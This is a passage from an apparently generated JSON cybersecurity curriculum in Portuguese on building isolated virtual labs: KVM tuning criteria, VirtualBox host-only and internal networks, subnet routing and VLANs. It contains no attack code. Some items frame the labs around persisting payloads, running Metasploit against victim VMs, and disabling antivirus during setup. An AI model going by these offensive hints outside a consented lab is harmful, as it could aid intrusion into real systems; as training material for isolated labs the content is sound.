                                "CPU pinning confirmado com zero migrações entre cores durante stress.",
                                "Live migration <20s com perda de pacotes <1%.",
                                "Desempenho sob carga mantém throughput >90% baseline.",
                                "Persistência de payloads confirmada via forensics pós-migração.",
                                "Logs sem erros de OOM ou TLB misses."
                              ],
                              "assessmentCriteria": [
                                "Execução correta de todos comandos sem erros de sintaxe.",
                                "Métricas de desempenho melhoradas em pelo menos 25% vs baseline.",
                                "Migração live bem-sucedida em 3 tentativas consecutivas.",
                                "Relatório de testes com evidências (screenshots/logs).",
                                "Identificação e correção de 2+ erros comuns simulados.",
                                "Explicação clara de trade-offs (ex: hugepages vs flexibilidade RAM)."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Gerenciamento avançado de memória e scheduling.",
                                "Redes: Configuração de túneis seguros para migração.",
                                "Segurança: Integração com forensics e persistência em ethical hacking.",
                                "Desempenho: Métricas NUMA e benchmarking em computação de alto desempenho."
                              ],
                              "realWorldApplication": "Em operações de Cyber Warfare reais, como Purple Team exercises, essas otimizações permitem labs KVM escaláveis para simular ataques persistentes em infra crítica, mantendo VMs migrando seamless durante defesas ativas sem perda de estado malicioso."
                            },
                            "estimatedTime": "3.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.7.1.1.1.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.7.2",
                    "name": "Configuração de Redes Virtuais Isoladas",
                    "description": "Criação de topologias de rede segmentadas para simular ambientes reais sem risco externo.",
                    "individualConcepts": [
                      {
                        "id": "10.1.7.2.1",
                        "name": "Fundamentos de Virtualização de Redes",
                        "description": "Compreensão dos princípios básicos de virtualização para criar redes isoladas que simulam ambientes reais sem exposição externa.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.2.1.1",
                            "name": "Instalar um Hypervisor para Redes Virtuais",
                            "description": "Configurar e instalar ferramentas como VirtualBox ou VMware Workstation para suportar múltiplas máquinas virtuais com redes isoladas, garantindo segmentação por meio de adaptadores de rede host-only.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Verificar e preparar o ambiente do host",
                                  "subSteps": [
                                    "Verifique se o processador suporta virtualização (VT-x/AMD-V) usando ferramentas como CPU-Z ou comandos do sistema operacional.",
                                    "Confirme requisitos mínimos: pelo menos 8GB RAM, 50GB espaço em disco livre e sistema operacional atualizado (Windows 10+, Linux Ubuntu 20+, macOS Ventura+).",
                                    "Desative conflitos como Hyper-V no Windows (via 'Turn Windows features on or off') ou instale módulos kernel necessários no Linux.",
                                    "Atualize o BIOS/UEFI para habilitar virtualização se desabilitada.",
                                    "Crie uma pasta dedicada para VMs (ex: C:\\VirtualMachines)."
                                  ],
                                  "verification": "Execute 'systeminfo' no Windows ou 'lscpu | grep Virtualization' no Linux e confirme suporte; pasta criada e espaço disponível.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Computador host compatível",
                                    "Ferramentas de diagnóstico (CPU-Z, systeminfo)",
                                    "Acesso administrador"
                                  ],
                                  "tips": "Faça backup de dados importantes antes de alterações no sistema; reinicie após desabilitar Hyper-V.",
                                  "learningObjective": "Garantir que o hardware e software do host suportem hypervisor sem conflitos.",
                                  "commonMistakes": [
                                    "Ignorar suporte a virtualização no BIOS",
                                    "Não desabilitar Hyper-V causando falhas de instalação",
                                    "Subestimar espaço em disco"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Baixar e instalar o hypervisor (VirtualBox como exemplo)",
                                  "subSteps": [
                                    "Acesse o site oficial (virtualbox.org) e baixe a versão mais recente para seu SO (ex: VirtualBox 7.x para Windows).",
                                    "Verifique a integridade do arquivo com hash SHA256 fornecido no site.",
                                    "Execute o instalador como administrador e siga o wizard, selecionando componentes de rede (Host-Only Networking).",
                                    "Instale Extension Pack do mesmo site para suporte USB/encriptação.",
                                    "Reinicie o sistema após instalação."
                                  ],
                                  "verification": "Abra VirtualBox; versão exibida na interface sem erros de lançamento.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Conexão à internet",
                                    "Navegador web",
                                    "Arquivo baixado de virtualbox.org"
                                  ],
                                  "tips": "Prefira VirtualBox para iniciantes (gratuito); VMware Workstation requer licença para uso avançado.",
                                  "learningObjective": "Instalar corretamente o software hypervisor com todos componentes necessários.",
                                  "commonMistakes": [
                                    "Baixar de fontes não oficiais (riscos de malware)",
                                    "Pular Extension Pack",
                                    "Não rodar como admin causando falhas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar adaptadores de rede host-only",
                                  "subSteps": [
                                    "Abra VirtualBox > Arquivo > Ferramentas > Rede Host-Only.",
                                    "Crie uma nova rede (ex: vboxnet0) com IPv4 automático (ex: 192.168.56.1/24).",
                                    "Desative DHCP server se quiser controle manual ou configure faixa IP.",
                                    "No Gerenciador de Rede do host, confirme adaptador 'VirtualBox Host-Only Network' ativo.",
                                    "Teste ping local no IP do adaptador via prompt de comando."
                                  ],
                                  "verification": "Ping bem-sucedido para o IP host-only (ex: ping 192.168.56.1); adaptador visível em ipconfig/ifconfig.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "VirtualBox instalado",
                                    "Prompt de comando/Terminal"
                                  ],
                                  "tips": "Use host-only para isolamento total; evite NAT para simular redes reais.",
                                  "learningObjective": "Criar rede virtual isolada acessível apenas por VMs e host.",
                                  "commonMistakes": [
                                    "Configurar NAT em vez de host-only",
                                    "Conflitos de IP com rede real",
                                    "DHCP não configurado causando falhas de conectividade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Criar e testar VMs com rede isolada",
                                  "subSteps": [
                                    "Crie nova VM: 2GB RAM, 20GB disco VDI, ISO de SO teste (ex: Ubuntu Server).",
                                    "Na configuração da VM > Rede > Adaptador 1: Host-only Adapter, selecione vboxnet0.",
                                    "Inicie VM, instale SO e configure IP estático compatível (ex: 192.168.56.10).",
                                    "Crie segunda VM similar e teste ping entre VMs e host.",
                                    "Verifique isolamento: sem acesso à internet externa ou rede física."
                                  ],
                                  "verification": "Ping bidirecional entre VMs e host; falha em ping para gateway externo.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": [
                                    "ISO de SO teste",
                                    "VirtualBox rodando"
                                  ],
                                  "tips": "Use snapshots antes de testes para rollback rápido.",
                                  "learningObjective": "Implementar segmentação de rede via hypervisor para ambientes isolados.",
                                  "commonMistakes": [
                                    "Selecionar adaptador errado (NAT em vez de host-only)",
                                    "IPs conflitantes",
                                    "Esquecer firewall na VM"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar configuração e otimizar",
                                  "subSteps": [
                                    "Monitore uso de recursos via Task Manager/Logs do VirtualBox.",
                                    "Habilite aceleração 3D se necessário nas configurações da VM.",
                                    "Configure bridged vs host-only para cenários específicos.",
                                    "Documente IPs, credenciais e exporte configuração OVF.",
                                    "Teste shutdown/restart das VMs preservando rede."
                                  ],
                                  "verification": "Logs sem erros críticos; VMs reiniciam com conectividade mantida.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Logs do VirtualBox",
                                    "Ferramentas de monitoramento"
                                  ],
                                  "tips": "Para Red Team, priorize isolamento para evitar vazamentos.",
                                  "learningObjective": "Otimizar e validar ambiente virtual para uso em simulações seguras.",
                                  "commonMistakes": [
                                    "Sobrecarga de RAM causando crashes",
                                    "Não documentar configurações",
                                    "Ignorar logs de erro"
                                  ]
                                }
                              ],
                              "practicalExample": "Instale VirtualBox em um laptop Windows 11, crie rede host-only 192.168.56.0/24, adicione duas VMs Ubuntu com IPs .10 e .11, teste ping interno e confirme isolamento da internet para simular uma rede corporativa para jogos de guerra cibernética.",
                              "finalVerifications": [
                                "Hypervisor lança sem erros e versão atualizada.",
                                "Rede host-only ativa com IPs atribuídos corretamente.",
                                "VMs se comunicam via ping, mas isoladas da rede externa.",
                                "Logs limpos, sem conflitos de hardware.",
                                "Snapshots criados para testes futuros.",
                                "Documentação de configuração salva."
                              ],
                              "assessmentCriteria": [
                                "Instalação completa sem prompts de erro (100% sucesso).",
                                "Rede host-only configurada com segmentação verificada (ping interno OK, externo falha).",
                                "Tempo total dentro de 1.5-2 horas.",
                                "Uso eficiente de recursos (CPU/RAM <80% em idle).",
                                "Capacidade de replicar em outro host.",
                                "Conhecimento demonstrado em troubleshooting comum."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Gerenciamento de redes virtuais e SOs guests.",
                                "Segurança Cibernética: Criação de labs isolados para pentests.",
                                "Redes de Computadores: Compreensão de adaptadores virtuais e VLANs simuladas.",
                                "Programação: Automatização via VBoxManage CLI.",
                                "Cloud Computing: Paralelos com AWS VPCs e VMs na nuvem."
                              ],
                              "realWorldApplication": "Em operações de Red Team, hypervisors como VirtualBox permitem montar labs isolados para simular ataques a infraestruturas críticas, testando defesas sem expor redes reais a riscos, comum em CTFs e exercícios de cybersecurity governamentais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.2.1.2",
                            "name": "Criar Máquinas Virtuais Isoladas",
                            "description": "Provisionar VMs com sistemas operacionais variados (Windows, Linux) e configurar interfaces de rede virtuais para simular hosts em uma topologia segura, evitando tráfego para a rede real.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Configurar Software de Virtualização",
                                  "subSteps": [
                                    "Baixe e instale um hypervisor gratuito como Oracle VirtualBox ou VMware Workstation Player.",
                                    "Execute o instalador com privilégios de administrador e siga o assistente de instalação padrão.",
                                    "Configure as preferências iniciais: aloque memória RAM suficiente (mínimo 8GB para o host) e habilite aceleração de hardware (VT-x/AMD-V).",
                                    "Crie um diretório dedicado para os arquivos das VMs (ex: C:\\CyberLab\\VMs).",
                                    "Verifique a instalação criando uma VM de teste temporária e descartando-a após boot."
                                  ],
                                  "verification": "Hypervisor inicia sem erros, Extension Pack está instalado (se aplicável), e configurações de aceleração de hardware são detectadas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Computador com 16GB+ RAM e processador com virtualização habilitada",
                                    "Download do VirtualBox/VMware",
                                    "ISO de SOs (Ubuntu, Windows)"
                                  ],
                                  "tips": [
                                    "Desative antivírus temporariamente durante instalação se houver conflitos.",
                                    "Use bridges apenas para host-local; evite NAT inicial para isolamento."
                                  ],
                                  "learningObjective": "Dominar a setup inicial de um hypervisor para ambientes isolados de cibersegurança.",
                                  "commonMistakes": [
                                    "Não habilitar virtualização no BIOS/UEFI.",
                                    "Instalar em partição com pouco espaço em disco.",
                                    "Ignorar requisitos de RAM, causando crashes."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Provisionar VMs com Sistemas Operacionais Variados",
                                  "subSteps": [
                                    "Crie uma nova VM para Linux (Ubuntu Server 22.04): aloque 2GB RAM, 20GB disco dinâmico, 2 CPUs.",
                                    "Monte a ISO do Ubuntu e instale o SO minimamente, configurando usuário root e senha forte.",
                                    "Repita para Windows (ex: Windows 10 LTSC): 4GB RAM, 40GB disco, instale com licença trial ou eval.",
                                    "Instale guest additions/tools em ambas VMs para melhor integração (sem rede real).",
                                    "Atualize os SOs internamente via ISO offline ou snapshot inicial."
                                  ],
                                  "verification": "Ambas VMs bootam para login, guest tools instalados, SOs atualizados sem rede externa.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "ISOs oficiais: Ubuntu 22.04, Windows 10 ISO",
                                    "Chaves de produto trial se necessário"
                                  ],
                                  "tips": [
                                    "Use discos dinâmicos para economizar espaço.",
                                    "Crie snapshots após instalação limpa para rollback rápido."
                                  ],
                                  "learningObjective": "Provisionar VMs multi-OS de forma padronizada para simulações de Red Team.",
                                  "commonMistakes": [
                                    "Alocar RAM excessiva, esgotando host.",
                                    "Esquecer senhas root/admin durante setup.",
                                    "Não criar snapshots, complicando testes."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Interfaces de Rede Virtuais Isoladas",
                                  "subSteps": [
                                    "No hypervisor, crie uma rede interna/host-only: desative DHCP se necessário, defina subnet 192.168.56.0/24.",
                                    "Atribua adaptadores de rede 'Internal Network' ou 'Host-Only' às VMs, sem bridge para rede real.",
                                    "Nas VMs, configure IPs estáticos: VM Linux 192.168.56.10/24 gateway none; VM Windows 192.168.56.20/24.",
                                    "Desative IPv6, firewall temporariamente para testes, e configure regras para permitir apenas tráfego interno.",
                                    "Teste ping entre VMs e confirme ausência de rota default ou acesso à internet."
                                  ],
                                  "verification": "Ping entre VMs succeeds; ping para 8.8.8.8 falha; ifconfig/ipconfig mostra apenas rede interna.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação de rede do hypervisor",
                                    "Ferramentas: ping, ipconfig, ifconfig"
                                  ],
                                  "tips": [
                                    "Nomeie a rede virtual como 'CyberLab-Isolated' para organização.",
                                    "Use Wireshark na VM para capturar tráfego e confirmar isolamento."
                                  ],
                                  "learningObjective": "Implementar topologias de rede virtuais seguras para simular ambientes de ataque isolados.",
                                  "commonMistakes": [
                                    "Configurar NAT/Bridge acidentalmente, expondo à rede real.",
                                    "IPs duplicados causando conflitos.",
                                    "Deixar firewall bloqueando tráfego interno."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar Isolamento e Simular Topologia Segura",
                                  "subSteps": [
                                    "Execute scans de rede (nmap na Linux VM) para mapear apenas hosts internos.",
                                    "Simule tráfego: transfira arquivos via SMB/HTTP entre VMs sem vazamento externo.",
                                    "Monitore tráfego com tcpdump/Wireshark: confirme zero pacotes para fora da subnet.",
                                    "Crie script simples para automação de verificação (ex: ping sweep interno).",
                                    "Documente a topologia em diagrama (use draw.io) e salve configuração como template."
                                  ],
                                  "verification": "Relatório de testes mostra isolamento total; diagrama topologia salvo.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Nmap, Wireshark/tcpdump instalados nas VMs",
                                    "Draw.io ou similar"
                                  ],
                                  "tips": [
                                    "Salve estado das VMs como OVA para reutilização em labs futuros.",
                                    "Teste com VM atacante (Kali) para validar cenários Red Team."
                                  ],
                                  "learningObjective": "Verificar e documentar ambientes isolados para operações cibernéticas seguras.",
                                  "commonMistakes": [
                                    "Não testar vazamentos com ferramentas ativas como nmap.",
                                    "Ignorar monitoramento de tráfego durante validação.",
                                    "Falta de documentação para reprodutibilidade."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team, crie VM Ubuntu (192.168.56.10) como servidor vítima rodando vulnerable web app, e VM Kali Linux (192.168.56.20) como estação atacante. Configure rede interna para simular exploit sem risco à rede corporativa; teste Metasploit de Kali para Ubuntu sem acesso externo.",
                              "finalVerifications": [
                                "VMs bootam e executam comandos básicos sem rede externa.",
                                "Ping e serviços internos funcionam; internet externa inacessível.",
                                "Nmap scan detecta apenas VMs na topologia interna.",
                                "Wireshark captura zero tráfego para fora da subnet isolada.",
                                "Snapshots criados e topologia documentada.",
                                "Template exportável para novos labs."
                              ],
                              "assessmentCriteria": [
                                "Correta instalação do hypervisor com aceleração habilitada (sem erros).",
                                "VMs multi-OS provisionadas com specs adequadas e guest tools.",
                                "Rede configurada como interna/host-only com IPs estáticos e isolamento comprovado.",
                                "Testes de validação (ping, nmap, Wireshark) executados com resultados positivos.",
                                "Documentação completa incluindo diagrama e passos reprodutíveis.",
                                "Tempo total dentro do estimado com eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Conceitos de subnetting, VLANs virtuais e firewalls.",
                                "Sistemas Operacionais: Gerenciamento de SOs Linux/Windows em ambientes virtuais.",
                                "Programação: Scripts de automação em Bash/PowerShell para provisionamento.",
                                "Segurança: Práticas de hardening e simulação de ataques éticos.",
                                "Cloud Computing: Paralelos com AWS EC2/VPC para isolamento em nuvem."
                              ],
                              "realWorldApplication": "Em operações de Red Team e pentests, profissionais criam labs isolados para testar exploits (ex: EternalBlue em Windows VM) sem comprometer redes reais, simulando cenários de ataque em CTFs, treinamentos militares ou avaliações de conformidade NIST."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.2.1.3",
                            "name": "Configurar Adaptadores de Rede Virtuais",
                            "description": "Definir tipos de adaptadores como NAT, Bridge e Internal para isolar o tráfego, permitindo simulação de ataques Red Team sem risco de vazamento para ambientes de produção.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Tipos de Adaptadores de Rede Virtuais",
                                  "subSteps": [
                                    "Pesquise e leia a documentação oficial do VirtualBox (ou software de VM escolhido) sobre adaptadores NAT, Bridge e Internal.",
                                    "Anote as diferenças: NAT (compartilha IP do host, isolado), Bridge (VM tem IP próprio na rede real), Internal (rede só entre VMs).",
                                    "Identifique cenários de uso para Red Team: NAT para testes isolados, Internal para simulações internas sem vazamento.",
                                    "Visualize diagramas de fluxo de tráfego para cada tipo usando ferramentas como draw.io.",
                                    "Compare com adaptadores reais em uma rede física para analogias."
                                  ],
                                  "verification": "Crie um resumo em 1 página com definições, diferenças e usos em Red Team, sem erros factuais.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação VirtualBox",
                                    "Notebook para anotações",
                                    "Ferramenta de diagramação (draw.io)"
                                  ],
                                  "tips": "Use tabelas para comparar tipos de adaptadores; foque em isolamento para segurança.",
                                  "learningObjective": "Diferenciar e justificar o uso de cada adaptador em contextos de isolamento de tráfego.",
                                  "commonMistakes": [
                                    "Confundir NAT com Bridge (NAT não expõe VM diretamente)",
                                    "Ignorar overhead de performance em Bridge"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Adaptador NAT em uma Máquina Virtual",
                                  "subSteps": [
                                    "Crie uma nova VM no VirtualBox com SO Linux/Windows para testes.",
                                    "Acesse Configurações > Rede > Adaptador 1 > Habilitar e selecionar 'NAT'.",
                                    "Inicie a VM, configure IP automático (DHCP) e teste conectividade com ping para google.com.",
                                    "Monitore tráfego no host com Wireshark para confirmar isolamento (sem IPs da VM visíveis externamente).",
                                    "Salve a configuração e documente o IP atribuído."
                                  ],
                                  "verification": "VM acessa internet, mas host não vê tráfego da VM em scans de rede locais.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "VirtualBox instalado",
                                    "ISO de SO para VM",
                                    "Wireshark"
                                  ],
                                  "tips": "Ative 'Port Forwarding' se precisar acessar serviços da VM do host.",
                                  "learningObjective": "Implementar NAT para acesso isolado à internet sem expor a VM à rede host.",
                                  "commonMistakes": [
                                    "Esquecer de habilitar o adaptador",
                                    "Não testar isolamento com Wireshark"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Adaptador Bridge para Integração com Rede Local",
                                  "subSteps": [
                                    "Pare a VM, vá para Configurações > Rede > mude para 'Bridge Adapter' e selecione a interface de rede do host.",
                                    "Inicie a VM, configure IP estático ou DHCP na mesma sub-rede do host.",
                                    "Teste conectividade: ping entre host e VM, e VM para outros dispositivos na LAN.",
                                    "Execute um scan Nmap da VM para dispositivos locais e confirme visibilidade mútua.",
                                    "Monitore para riscos: identifique por que Bridge não é ideal para Red Team isolado."
                                  ],
                                  "verification": "VM recebe IP da rede local e é pingável de outros hosts na LAN.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "VirtualBox",
                                    "VM existente",
                                    "Nmap instalado na VM"
                                  ],
                                  "tips": "Use bridge apenas em redes de teste controladas; evite em produção.",
                                  "learningObjective": "Configurar Bridge para simular VM como dispositivo real na rede, entendendo riscos de vazamento.",
                                  "commonMistakes": [
                                    "Selecionar interface errada (WiFi vs Ethernet)",
                                    "Conflitos de IP na sub-rede"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Rede Internal e Testar Isolamento Total",
                                  "subSteps": [
                                    "Crie uma segunda VM, configure ambas com 'Internal Network' no nome da rede (ex: 'redteam-isolada').",
                                    "Configure IPs estáticos em ambas (ex: 192.168.100.10/24 e .11/24).",
                                    "Teste ping entre as duas VMs; confirme falta de conectividade com host ou internet.",
                                    "Simule ataque Red Team: use uma VM para escanear/ataque a outra com Metasploit ou nmap.",
                                    "Verifique logs de firewall do host para ausência de tráfego das VMs."
                                  ],
                                  "verification": "Comunicação apenas entre VMs internas; zero tráfego para fora da rede Internal.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Duas VMs no VirtualBox",
                                    "Ferramentas de ataque (Nmap, Metasploit)"
                                  ],
                                  "tips": "Nomeie redes Internal unicamente para evitar conflitos; teste com Wireshark em todas as interfaces.",
                                  "learningObjective": "Criar rede isolada perfeita para simulações de ataques sem risco de vazamento.",
                                  "commonMistakes": [
                                    "IPs em sub-redes diferentes",
                                    "Não testar isolamento com host/internet"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um exercício Red Team, configure uma VM atacante com Internal Network para lançar exploits contra uma VM vítima na mesma rede isolada, simulando um ataque lateral sem afetar a rede corporativa real.",
                              "finalVerifications": [
                                "Explique diferenças entre NAT, Bridge e Internal em uma entrevista simulada.",
                                "Configure os três tipos em VMs e demonstre isolamento com Wireshark.",
                                "Simule um ataque em rede Internal sem vazamento detectado no host.",
                                "Documente configurações em um relatório com screenshots.",
                                "Resolva um problema de conectividade intencionalmente quebrado em Bridge.",
                                "Compare performance de tráfego em cada adaptador com iperf."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração sem erros de rede (100% conectividade esperada).",
                                "Demonstração clara de isolamento (zero vazamentos comprovados).",
                                "Documentação completa com diagramas e logs.",
                                "Justificativa correta de usos em Red Team.",
                                "Tempo de execução dentro dos estimados (±20%).",
                                "Identificação e correção de 3 erros comuns simulados."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Conceitos de roteamento e switching.",
                                "Segurança da Informação: Isolamento em pentests e honeypots.",
                                "Sistemas Operacionais: Configuração de interfaces de rede (ifconfig/ip).",
                                "Programação: Scripts em Python para automação de testes de rede (Scapy).",
                                "Infraestrutura de TI: Virtualização avançada (Docker networks como extensão)."
                              ],
                              "realWorldApplication": "Em operações de Red Team profissionais, configure redes Internal em labs para simular ataques persistentes e laterais movement sem comprometer infraestruturas de produção, como em certificações OSCP ou engajamentos de pentest reais."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.7.2.2",
                        "name": "Segmentação e Topologias de Rede",
                        "description": "Projeto de topologias segmentadas usando sub-redes e VLANs virtuais para replicar infraestruturas corporativas em cenários de jogos cibernéticos.",
                        "specificSkills": [
                          {
                            "id": "10.1.7.2.2.1",
                            "name": "Implementar Sub-redes Isoladas",
                            "description": "Dividir o ambiente virtual em sub-redes (ex: 192.168.1.0/24 para DMZ, 10.0.0.0/24 para interna) com roteamento controlado via VMs router para simular barreiras de segurança.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Planejar Topologia e Endereçamento de Sub-redes",
                                  "subSteps": [
                                    "Analise os requisitos do ambiente de simulação (ex: DMZ pública, rede interna segura).",
                                    "Defina sub-redes usando CIDR: 192.168.1.0/24 para DMZ, 10.0.0.0/24 para interna, 172.16.0.0/24 para gerenciamento.",
                                    "Esboce diagrama de topologia com VMs router no centro conectando sub-redes.",
                                    "Calcule máscaras de sub-rede e intervalos de IP disponíveis.",
                                    "Documente regras de roteamento iniciais (ex: permitir tráfego HTTP da DMZ para interna apenas via router)."
                                  ],
                                  "verification": "Diagrama de topologia completo com endereços IP alocados e regras documentadas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta de diagramação (Draw.io ou papel), calculadora de sub-redes online"
                                  ],
                                  "tips": "Use endereços RFC 1918 privados para evitar conflitos reais.",
                                  "learningObjective": "Compreender princípios de segmentação de rede e cálculo de sub-redes.",
                                  "commonMistakes": [
                                    "Escolha incorreta de CIDR levando a sobreposição de redes",
                                    "Ignorar espaço para crescimento de hosts"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar VMs e Interfaces de Rede Isoladas",
                                  "subSteps": [
                                    "Crie VMs para DMZ, interna e router em hypervisor (ex: VirtualBox/VMware).",
                                    "Configure adaptadores de rede: modo 'Internal Network' ou 'Host-only' para isolamento.",
                                    "Atribua IPs estáticos: DMZ VM (192.168.1.10/24), Interna (10.0.0.10/24), Router interfaces duplas.",
                                    "Desative DHCP nas sub-redes para controle manual.",
                                    "Inicie VMs e verifique conectividade básica dentro da mesma sub-rede via ping."
                                  ],
                                  "verification": "Ping bem-sucedido entre hosts na mesma sub-rede, falha entre sub-redes diferentes.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Hypervisor instalado (VirtualBox/VMware), VMs base (Ubuntu Server)"
                                  ],
                                  "tips": "Nomeie redes internas no hypervisor para clareza (ex: 'DMZ-Net', 'Internal-Net').",
                                  "learningObjective": "Configurar isolamento de rede virtual em hypervisors.",
                                  "commonMistakes": [
                                    "Configurar adaptadores bridged em vez de internal/host-only",
                                    "IPs duplicados entre sub-redes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Roteamento Controlado na VM Router",
                                  "subSteps": [
                                    "Instale e configure IP forwarding no router VM (sysctl net.ipv4.ip_forward=1).",
                                    "Adicione rotas estáticas: ip route add 10.0.0.0/24 via interface interna.",
                                    "Configure iptables para regras de firewall: permitir ICMP limitado, bloquear tráfego indesejado.",
                                    "Ative NAT se necessário para saída à internet da DMZ.",
                                    "Salve configurações persistentes (ex: /etc/sysctl.conf, iptables-persistent)."
                                  ],
                                  "verification": "Tráfego roteado corretamente entre sub-redes conforme regras, logs de firewall confirmam bloqueios.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "VM Router com Linux (Ubuntu/Debian), comandos ip route e iptables"
                                  ],
                                  "tips": "Teste rotas com 'ip route show' antes de aplicar regras de firewall.",
                                  "learningObjective": "Dominar roteamento e controle de tráfego via firewall em Linux.",
                                  "commonMistakes": [
                                    "Esquecer de ativar IP forwarding",
                                    "Regras de iptables em ordem errada permitindo tráfego excessivo"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar Isolamento de Sub-redes",
                                  "subSteps": [
                                    "Execute pings cross-sub-rede: deve falhar sem rotas, suceder via router.",
                                    "Simule ataque: tente acesso não autorizado da DMZ para interna (deve ser bloqueado).",
                                    "Monitore tráfego com tcpdump/wireshark em interfaces do router.",
                                    "Verifique logs de firewall e ajuste regras para cenários de Red Team.",
                                    "Documente resultados em relatório de teste."
                                  ],
                                  "verification": "Relatório confirmando isolamento: conectividade controlada, bloqueios efetivos.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Ferramentas tcpdump/wireshark, scanner nmap para testes"
                                  ],
                                  "tips": "Use nmap para varreduras controladas: nmap -sn 192.168.1.0/24.",
                                  "learningObjective": "Validar efetividade de barreiras de segurança em redes segmentadas.",
                                  "commonMistakes": [
                                    "Não testar cenários de falha",
                                    "Interpretar erroneamente falhas de ping como sucesso"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab VirtualBox, crie 3 VMs: WebServer (DMZ: 192.168.1.10), Database (Interna: 10.0.0.10), Router. Configure router com eth0 (DMZ) e eth1 (Interna). Adicione rota estática no Database para DMZ via Router IP. Teste: curl do WebServer para Database falha sem rota, sucede após configuração, mas firewall bloqueia portas sensíveis.",
                              "finalVerifications": [
                                "Hosts em sub-redes diferentes não se comunicam sem router.",
                                "Roteamento funciona apenas para tráfego permitido.",
                                "Firewall logs mostram bloqueios de tentativas não autorizadas.",
                                "Nmap scan confirma visibilidade limitada entre sub-redes.",
                                "Configurações persistem após reboot das VMs.",
                                "Diagrama e relatório de testes completos."
                              ],
                              "assessmentCriteria": [
                                "Precisão no cálculo e alocação de sub-redes (sem sobreposições).",
                                "Configuração correta de isolamento virtual (testes de ping).",
                                "Implementação funcional de roteamento e firewall.",
                                "Validação completa com ferramentas de rede (tcpdump/nmap).",
                                "Documentação clara de topologia e regras.",
                                "Eficiência temporal (dentro de 3 horas totais)."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Conceitos de CIDR e roteamento.",
                                "Segurança da Informação: Firewalls e segmentação Zero Trust.",
                                "Sistemas Operacionais: Configurações Linux de rede (ip route, iptables).",
                                "Programação: Scripts de automação para configuração de rede (Ansible).",
                                "Análise de Dados: Monitoramento de tráfego com Wireshark."
                              ],
                              "realWorldApplication": "Em ambientes empresariais, segmentação com sub-redes isoladas previne propagação de ataques (ex: WannaCry), usada em data centers AWS VPC ou Azure VNet para separar DMZ de recursos críticos, simulando defesas em exercícios de Red Team/Blue Team."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.7.2.2.2",
                            "name": "Configurar VLANs Virtuais",
                            "description": "Usar switches virtuais em ferramentas como GNS3 para criar VLANs (ex: VLAN 10 para servidores, VLAN 20 para estações) e trunking para interconexões segmentadas em simulações Red Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Ambiente GNS3 para Simulação de Rede",
                                  "subSteps": [
                                    "Instale e abra o GNS3, garantindo que o IOU (IOS on Unix) ou switches virtuais como IOL estejam disponíveis.",
                                    "Crie um novo projeto e adicione dois switches virtuais (ex: Switch1 e Switch2) e dispositivos de teste (um servidor em VLAN 10 e estações em VLAN 20).",
